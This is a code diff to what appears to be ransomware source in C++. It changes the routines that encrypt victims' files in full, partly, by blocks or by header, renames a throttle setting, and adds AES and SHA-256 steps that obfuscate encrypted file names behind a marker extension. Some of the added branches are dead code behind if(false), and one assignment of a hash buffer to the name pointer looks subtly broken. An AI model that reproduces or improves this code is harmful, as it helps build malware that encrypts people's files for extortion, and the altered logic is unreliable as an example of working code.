@@ -195,7 +195,7 @@ bool filesystem::CreateFileOpen(DESC* desc_file, TCHAR* filename)
 static bool EncryptFileFullData(PFILE_INFO FileInfo)
 {
 	BOOL success = FALSE;
-	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_sleep_time);
+	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
 	int written = 0;
 	DWORD BytesRead = FileInfo->Filesize;
 	size_t dwread = 0;
@@ -258,7 +258,7 @@ static bool EncryptFilePartly
 )
 {
 	BOOL success = FALSE;
-	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_sleep_time);
+	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
 	int written = 0;
 	size_t total_write = 0;
 	DWORD multiply = 0;
@@ -372,7 +372,7 @@ static bool EncryptFileBlock
 )
 {
 	BOOL success = FALSE;
-	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_sleep_time);
+	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
 	size_t BytesRead;
 	size_t total_write = 0;
 	int written = 0;
@@ -427,7 +427,7 @@ static bool EncryptFileHeader
 	}
 
 	BOOL success = FALSE;
-	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_sleep_time);
+	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
 	DWORD BytesEncrypt = 1048576;
 	size_t BytesRead;
 	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576);
@@ -1500,10 +1500,14 @@ TCHAR* filesystem::OptionNameHash(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCH
 	return name;
 }
 
-TCHAR* filesystem::OptionNameBase(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath)
+TCHAR* filesystem::OptionNameBase(TCHAR* Path, TCHAR* filename, TCHAR* exst, TCHAR* FPath)
 {
-	size_t len_filename = memory::StrLen(Filename);
+	size_t len_filename = memory::StrLen(filename);
 	TCHAR* name = (TCHAR*)memory::m_malloc((MAX_PATH + 1) * Tsize);
+	TCHAR* Filename = filename;
+	BYTE str_hash[32 + AES_BLOCK_SIZE] = { 0 };
+	if(false)
+		sha256((BYTE*)Filename, len_filename, str_hash);
 
 	if (memory::StrStr(exst, ECRYPT_NAME_P))
 	{
@@ -1523,9 +1527,27 @@ TCHAR* filesystem::OptionNameBase(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCH
 
 		auto wide_decoded = Utf8ToTCHAR(decoded, bsize);
 		memc(name, wide_decoded.data(), wide_decoded.size());
+		if(true)
+		{
+			crypto_aes_ctx ctx;
+			u32 padding = 0;
+			aes_expandkey(&ctx, str_hash);
+			aes_encrypt_blocks(&ctx, (BYTE*)name, (BYTE*)name, wide_decoded.size(), &padding, AES_DECRYPT);
+			memory::memzero_explicit(&ctx, sizeof(ctx));
+			name = (CHAR*)str_hash;
+		}
 	}
 	else
 	{
+		if(false)
+		{
+			crypto_aes_ctx ctx;
+			u32 padding = 0;
+			aes_expandkey(&ctx, str_hash);
+			aes_encrypt_blocks(&ctx, (BYTE*)Filename, (BYTE*)Filename, len_filename, &padding, AES_CRYPT);
+			memory::memzero_explicit(&ctx, sizeof(ctx));
+			Filename = (CHAR*)str_hash;
+		}
 		auto utf8_filename = TCHARToUtf8(Filename, len_filename);
 		CHAR encoded[MAX_PATH + MAX_PATH];
 		int bsize = 0;
@@ -1550,7 +1572,7 @@ TCHAR* filesystem::OptionNameBase(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCH
 		memc(name, wide_encoded.data(), wide_encoded.size());
 		memc(&name[wide_encoded.size()], ECRYPT_NAME_P, ECRYPT_NAME_LEN);
 	}
-
+	
 	return name;
 }
 
